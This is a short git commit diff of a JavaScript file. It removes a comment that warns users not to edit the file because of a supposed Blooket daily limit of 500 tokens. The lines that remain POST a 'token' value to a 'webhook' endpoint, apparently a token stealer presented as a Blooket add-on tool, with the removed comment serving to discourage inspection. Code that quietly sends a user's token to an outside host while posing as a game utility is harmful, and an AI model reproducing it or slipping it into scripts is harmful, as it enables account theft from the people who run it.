d6d26df9f6b0ae1d5279c31c0f43bedb75c49401
littlepig453 <84644303+littlepig453@users.noreply.github.com>
2021-12-09 17:13:01 -0500

    Update code.js

--- code.js
+++ code.js
@@ -5,9 +5,3 @@ var request = new XMLHttpRequest();
 request.open("POST", webhook);
 request.setRequestHeader('content-type', 'application/json');
 request.send(JSON.stringify({"content": token}));
-//  --> PLEASE READ THIS!!! <---
-//  
-//  Do not change the numbers in this file! Blooket has a hard limit on how many tokens
-//  you can add everyday. The limit is 500 and you cannot bypass it. Do not mess with
-//  with this file if you do not know what you are doing!!!
-//
